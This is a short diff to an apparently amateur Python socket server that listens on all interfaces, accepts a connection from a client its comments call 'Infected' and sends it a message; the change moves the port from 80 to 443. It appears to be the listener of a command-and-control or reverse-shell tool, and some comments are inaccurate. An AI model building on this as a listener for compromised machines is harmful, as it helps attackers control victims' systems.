@@ -1,7 +1,7 @@
 import socket
 
 Host = "0.0.0.0"  #Host listens on everything 
-Port = 80           #HTTP Port
+Port = 443       #HTTP Port
 
 Size = 1024 * 128  #Size of message
 
@@ -17,8 +17,6 @@ s.bind((Host,Port)) # binds the host IP to port
 
 s.listen(5)                 #Waits 5 minutes for a connection before ending
 print(f"Listening as {Host}:{Port} ...") #Tells the use what IPs to listen and port it is listening on 
-
-
 
 infected, client_address = s.accept()       #Accepts connection from Infected and stores Infected as the IP address and client_address as the port
 infected.send(b_mess) #Sends a message to infected. Not currently working. Pls convert to byte
